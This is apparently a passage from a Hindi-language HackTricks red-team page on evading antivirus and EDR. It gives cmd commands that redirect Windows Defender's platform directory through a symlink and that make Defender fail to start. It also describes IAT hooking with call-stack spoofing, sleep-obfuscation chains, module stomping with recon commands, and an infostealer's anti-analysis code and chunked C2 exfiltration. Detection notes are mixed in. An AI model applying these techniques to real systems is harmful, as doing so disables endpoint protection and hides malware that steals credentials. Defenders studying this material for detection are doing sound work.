set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform के अंदर एक higher-version directory symlink बनाएं जो आपके folder की ओर point करे:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) ट्रिगर selection (reboot recommended):
```cmd
shutdown /r /t 0
```
4) Verify MsMpEng.exe (WinDefend) redirected path से चलता है:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
आपको `C:\TMP\AV\` के तहत नए process path को और उस स्थान को दर्शाती service configuration/registry को observe करना चाहिए।

Post-exploitation options
- DLL sideloading/code execution: Defender द्वारा उसके application directory से load की जाने वाली DLLs को drop/replace करें ताकि Defender के processes में code execute हो सके। ऊपर वाला section देखें: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink हटा दें ताकि next start पर configured path resolve न हो और Defender start होने में fail हो:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> ध्यान दें कि यह तकनीक अपने आप privilege escalation नहीं देती; इसके लिए admin rights चाहिए।

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams runtime evasion को C2 implant से निकालकर target module के अंदर ही ला सकते हैं, इसके Import Address Table (IAT) को hook करके और selected APIs को attacker-controlled, position‑independent code (PIC) के through route करके। यह approach evasion को उन छोटे API surface से आगे बढ़ाती है जो कई kits expose करते हैं (e.g., CreateProcessA), और वही protections BOFs और post‑exploitation DLLs तक extend करती है।

High-level approach
- एक PIC blob को target module के साथ reflective loader (prepended या companion) का उपयोग करके stage करें। PIC self‑contained और position‑independent होना चाहिए।
- जैसे ही host DLL load हो, उसका IMAGE_IMPORT_DESCRIPTOR walk करें और targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) के IAT entries को thin PIC wrappers पर point करने के लिए patch करें।
- हर PIC wrapper real API address पर tail-call करने से पहले evasions execute करता है। Typical evasions में शामिल हैं:
- Call से पहले memory mask/unmask (e.g., beacon regions encrypt करना, RWX→RX, page names/permissions बदलना) और फिर post‑call restore करना।
- Call-stack spoofing: एक benign stack construct करें और target API में transition करें ताकि call-stack analysis expected frames resolve करे।
- Compatibility के लिए, एक interface export करें ताकि Aggressor script (या equivalent) Beacon, BOFs और post-ex DLLs के लिए किन APIs को hook करना है, register कर सके।

Why IAT hooking here
- यह किसी भी code के लिए काम करता है जो hooked import use करता है, बिना tool code modify किए या specific APIs proxy करने के लिए Beacon पर निर्भर हुए।
- Post-ex DLLs को cover करता है: LoadLibrary* को hook करने से आप module loads (e.g., System.Management.Automation.dll, clr.dll) intercept कर सकते हैं और उनके API calls पर वही masking/stack evasion apply कर सकते हैं।
- call-stack–based detections के खिलाफ process-spawning post-ex commands का reliable use वापस लाता है, CreateProcessA/W को wrap करके।

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- relocations/ASLR के बाद और import के first use से पहले patch लागू करें। TitanLdr/AceLdr जैसे reflective loaders loaded module के DllMain के दौरान hooking दिखाते हैं।
- Wrappers को tiny और PIC-safe रखें; patching से पहले कैप्चर किए गए original IAT value या LdrGetProcedureAddress के जरिए true API resolve करें।
- PIC के लिए RW → RX transitions का उपयोग करें और writable+executable pages छोड़ने से बचें।

Call‑stack spoofing stub
- Draugr‑style PIC stubs एक fake call chain बनाते हैं (benign modules में return addresses) और फिर real API में pivot करते हैं।
- यह उन detections को defeat करता है जो Beacon/BOFs से sensitive APIs तक canonical stacks की उम्मीद करती हैं।
- Stack cutting और stack stitching techniques के साथ pair करें ताकि API prologue से पहले expected frames में land किया जा सके।

Operational integration
- Reflective loader को post-ex DLLs के सामने prepend करें ताकि DLL load होते ही PIC और hooks automatically initialise हो जाएँ।
- Target APIs register करने के लिए Aggressor script का उपयोग करें, ताकि Beacon और BOFs बिना code changes के उसी evasion path से benefit लें।

Detection/DFIR considerations
- IAT integrity: ऐसी entries जो non-image (heap/anon) addresses पर resolve होती हैं; import pointers की periodic verification।
- Stack anomalies: return addresses जो loaded images से belong नहीं करते; non-image PIC में abrupt transitions; inconsistent RtlUserThreadStart ancestry।
- Loader telemetry: IAT में in-process writes, early DllMain activity जो import thunks modify करती है, load के समय बने unexpected RX regions।
- Image-load evasion: अगर hooking LoadLibrary* कर रहे हों, तो suspicious loads of automation/clr assemblies को memory masking events के साथ correlate करके monitor करें।

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (e.g., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

If you control a reflective loader, you can hook imports **during** `ProcessImports()` by replacing the loader's `GetProcAddress` pointer with a custom resolver that checks hooks first:

- एक **resident PICO** (persistent PIC object) बनाएं जो transient loader PIC के खुद को free करने के बाद भी survive करे।
- `setup_hooks()` function export करें जो loader के import resolver को overwrite करे (e.g., `funcs.GetProcAddress = _GetProcAddress`)।
- `_GetProcAddress` में ordinal imports को skip करें और hash-based hook lookup जैसे `__resolve_hook(ror13hash(name))` का उपयोग करें। अगर hook मौजूद हो, तो उसे return करें; वरना real `GetProcAddress` को delegate करें।
- Crystal Palace `addhook "MODULE$Func" "hook"` entries के साथ link time पर hook targets register करें। Hook valid रहता है क्योंकि यह resident PICO के अंदर रहता है।

इससे loaded DLL के code section को post-load patch किए बिना **import-time IAT redirection** मिलती है।

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks केवल तब trigger होते हैं जब function सच में target के IAT में हो। अगर कोई module PEB-walk + hash से APIs resolve करता है (कोई import entry नहीं), तो loader के `ProcessImports()` path को उसे देखने देने के लिए real import force करें:

- Hashed export resolution (e.g., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) को direct reference जैसे `&WaitForSingleObject` से replace करें।
- Compiler एक IAT entry emit करता है, जिससे reflective loader द्वारा imports resolve होते समय interception संभव हो जाता है।

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

`Sleep` को patch करने के बजाय, implant द्वारा उपयोग किए गए **actual wait/IPC primitives** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`) को hook करें। Long waits के लिए, call को Ekko-style obfuscation chain में wrap करें जो idle के दौरान in-memory image को encrypt करती है:

- `CreateTimerQueueTimer` का उपयोग करके callbacks की एक sequence schedule करें जो crafted `CONTEXT` frames के साथ `NtContinue` call करती है।
- Typical chain (x64): image को `PAGE_READWRITE` करें → `advapi32!SystemFunction032` से full mapped image पर RC4 encrypt करें → blocking wait perform करें → RC4 decrypt करें → PE sections को walk करके **restore per-section permissions** करें → completion signal करें।
- `RtlCaptureContext` एक template `CONTEXT` देता है; उसे multiple frames में clone करें और registers (`Rip`/`Rcx`/`Rdx`/`R8`/`R9`) set करें ताकि हर step invoke हो सके।

Operational detail: long waits के लिए “success” return करें (e.g., `WAIT_OBJECT_0`) ताकि caller continue करे जबकि image masked हो। यह pattern idle windows के दौरान module को scanners से छुपाता है और classic “patched `Sleep()`” signature से बचता है।

Detection ideas (telemetry-based)
- `NtContinue` की ओर point करते हुए `CreateTimerQueueTimer` callbacks के bursts।
- बड़े contiguous image-sized buffers पर `advapi32!SystemFunction032` का उपयोग।
- Large-range `VirtualProtect` के बाद custom per-section permission restoration।

### Runtime CFG registration for sleep-obfuscation gadgets

CFG-enabled targets पर, mid-function gadget जैसे `jmp [rbx]` या `jmp rdi` में पहला indirect jump आमतौर पर process को `STATUS_STACK_BUFFER_OVERRUN` के साथ crash करा देगा क्योंकि gadget module के CFG metadata में मौजूद नहीं है। Hardened processes के अंदर Ekko/Kraken-style chains को alive रखने के लिए:

- Chain द्वारा उपयोग किए गए हर indirect destination को `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` और `CFG_CALL_TARGET_VALID` entries के साथ register करें।
- Loaded images (`ntdll`, `kernel32`, `advapi32`) के अंदर addresses के लिए `MEMORY_RANGE_ENTRY` को **image base** से शुरू होना चाहिए और **full image size** cover करना चाहिए।
- Manually mapped/PIC/stomped regions के लिए **allocation base** और allocation size का उपयोग करें।
- केवल dispatch gadget ही नहीं, बल्कि indirectly reached exports (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) और attacker-controlled executable sections जो indirect targets बनेंगे, उन्हें भी mark करें।

इससे ROP/JOP-style sleep chains “works only in non-CFG processes” से एक reusable primitive बन जाती हैं `explorer.exe`, browsers, `svchost.exe`, और `/guard:cf` के साथ compiled अन्य endpoints के लिए।

### CET-safe stack spoofing for sleeping threads

Full `CONTEXT` replacement noisy होती है और CET Shadow Stack systems पर टूट सकती है क्योंकि spoofed `Rip` को hardware shadow stack से फिर भी match करना पड़ता है। Sleep-masking का एक safer pattern:

- उसी process में किसी दूसरे thread को चुनें और `NtQueryInformationThread` के जरिए उसके `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) पढ़ें।
- Current thread के real TEB/TIB का backup लें।
- `GetThreadContext` से real sleeping context capture करें।
- Spoof context में केवल real `Rip` copy करें, spoofed `Rsp`/stack state intact छोड़ते हुए।
- Sleep window के दौरान, spoof thread के `NT_TIB` को current TEB में copy करें ताकि stack walkers legitimate stack range के अंदर unwind करें।
- Wait खत्म होने के बाद original TIB और thread context restore करें।

यह CET-consistent instruction pointer बनाए रखता है जबकि EDR stack walkers को भ्रमित करता है जो unwind validation के लिए TEB stack metadata पर भरोसा करते हैं।

### APC-based alternative: Kraken Mask

अगर timer-queue dispatch बहुत signatured है, तो वही sleep-encrypt-spoof-restore sequence suspended helper thread से queued APCs के जरिए execute किया जा सकता है:

- `NtTestAlert` को entrypoint बनाकर एक helper thread create करें।
- `NtQueueApcThread` के साथ तैयार `CONTEXT` frames/APCs queue करें और `NtAlertResumeThread` से उन्हें drain करें।
- Default 64 KB thread stack exhausting से बचने के लिए chain state को helper stack की बजाय heap पर store करें।
- Start event को atomically signal करने और block करने के लिए `NtSignalAndWaitForSingleObject` का उपयोग करें।
- TIB/context restore करने से पहले main thread suspend करें (`NtSuspendThread` → restore → `NtResumeThread`) ताकि race window कम हो जहाँ scanner half-restored stack पकड़ सके।

यह `CreateTimerQueueTimer` + `NtContinue` signature को helper-thread/APC signature से बदल देता है, जबकि वही RC4 masking और stack-spoofing goals बनाए रखता है।

Additional detection ideas
- Sleep, waits, या APC dispatch से ठीक पहले `VmCfgCallTargetInformation` के साथ `NtSetInformationVirtualMemory`।
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject`, या `ConnectNamedPipe` के चारों ओर wrapped `GetThreadContext`/`SetThreadContext`।
- `NtQueryInformationThread` के बाद current thread के TEB/TIB stack bounds में direct writes।
- `NtQueueApcThread`/`NtAlertResumeThread` chains जो indirectly `SystemFunction032`, `VirtualProtect`, या section-permission restoration helpers तक पहुँचती हैं।
- `FF 23` (`jmp [rbx]`) या `FF E7` (`jmp rdi`) जैसे short gadget signatures का signed modules के अंदर dispatch pivots के रूप में repeated use।


## Precision Module Stomping

Module stomping payloads को target process में पहले से mapped DLL के **`.text` section** से execute करता है, obvious private executable memory allocate करने या fresh sacrificial DLL load करने के बजाय। Overwrite target एक **loaded, disk-backed image** होना चाहिए जिसका code space process को अभी भी चाहिए होने वाले code paths को corrupt किए बिना payload absorb कर सके।

### Reliable target selection

`uxtheme.dll` या `comctl32.dll` जैसे common modules पर naive stomping fragile है: DLL remote process में loaded न भी हो सकती है, और बहुत छोटा code region process crash करा सकता है। अधिक reliable workflow:

1. Target process modules enumerate करें और पहले से loaded DLLs की **names-only include list** रखें।
2. Payload पहले build करें और उसका **exact byte size** रिकॉर्ड करें।
3. Disk पर candidate DLLs scan करें और PE section **`.text` `Misc_VirtualSize`** को payload size से compare करें। File size से यह अधिक महत्वपूर्ण है क्योंकि यह memory में mapped होने पर executable section का size दिखाता है।
4. **Export Address Table (EAT)** parse करें और stomp start offset के लिए exported function RVA चुनें।
5. **Blast radius** calculate करें: अगर payload selected function boundary से बड़ा है, तो यह उसके बाद memory में laid out adjacent exports को overwrite करेगा।

Wild में दिखने वाले typical recon/selection helpers:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operational notes
- Remote process में पहले से **loaded** DLLs को prefer करें, ताकि `LoadLibrary`/unexpected image loads की telemetry से बचा जा सके।
- ऐसे exports को prefer करें जो target application में rarely executed हों, वरना normal code paths thread creation से पहले या बाद में stomped bytes पर hit कर सकते हैं।
- Large implants अक्सर shellcode embedding को string literal से बदलकर **byte-array/braced initializer** में करना require करते हैं, ताकि पूरा buffer injector source में correctly represent हो।

Detection ideas
- Remote writes into **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) बजाय more common private RWX/RX allocations के।
- Export entry points whose in-memory bytes no longer match the backing file on disk.
- Remote threads or context pivots that begin execution inside a legitimate DLL export whose first bytes were recently modified.
- Suspicious `VirtualProtect(Ex)` / `WriteProcessMemory` sequences against DLL `.text` pages followed by thread creation.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) दिखाता है कि modern info-stealers कैसे AV bypass, anti-analysis और credential access को एक ही workflow में blend करते हैं।

### Keyboard layout gating & sandbox delay

- A config flag (`anti_cis`) installed keyboard layouts को `GetKeyboardLayoutList` से enumerate करता है। अगर Cyrillic layout मिलता है, तो sample एक empty `CIS` marker drop करता है और stealers चलाने से पहले terminate हो जाता है, जिससे यह excluded locales पर कभी detonate नहीं होता और एक hunting artifact छोड़ देता है।
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Layered `check_antivm` logic

- Variant A process list को walks करता है, हर name को custom rolling checksum से hash करता है, और debuggers/sandboxes के लिए embedded blocklists से compare करता है; यह computer name पर भी checksum दोहराता है और `C:\analysis` जैसी working directories check करता है।
- Variant B system properties inspect करता है (process-count floor, recent uptime), VirtualBox additions detect करने के लिए `OpenServiceA("VBoxGuest")` call करता है, और single-stepping spot करने के लिए sleeps के around timing checks perform करता है। कोई भी hit modules launch होने से पहले abort कर देता है।

### Fileless helper + double ChaCha20 reflective loading

- Primary DLL/EXE एक Chromium credential helper embed करता है, जिसे या तो disk पर drop किया जाता है या in-memory manually mapped किया जाता है; fileless mode imports/relocations खुद resolve करता है ताकि कोई helper artifacts न लिखे जाएँ।
- वह helper दूसरे-stage DLL को ChaCha20 से दो बार encrypted रूप में store करता है (दो 32-byte keys + 12-byte nonces)। दोनों passes के बाद, यह blob को reflectively load करता है (`LoadLibrary` नहीं) और [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) से derived `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` exports call करता है।
- ChromElevator routines direct-syscall reflective process hollowing का उपयोग करके live Chromium browser में inject करती हैं, AppBound Encryption keys inherit करती हैं, और ABE hardening के बावजूद SQLite databases से सीधे passwords/cookies/credit cards decrypt करती हैं।


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` global `memory_generators` function-pointer table iterate करता है और हर enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.) के लिए एक thread spawn करता है। हर thread shared buffers में results लिखता है और ~45s join window के बाद अपना file count report करता है।
- पूरा होने पर, सब कुछ statically linked `miniz` library से `%TEMP%\\Log.zip` के रूप में zip किया जाता है। फिर `ThreadPayload1` 15s sleep करता है और archive को 10 MB chunks में HTTP POST के जरिए `http://<C2>:6767/upload` पर stream करता है, browser `multipart/form-data` boundary (`----WebKitFormBoundary***`) spoof करते हुए। हर chunk में `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>` add होता है, और आखिरी chunk `complete: true` append करता है ताकि C2 को पता चले कि reassembly पूरी हो गई है।

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
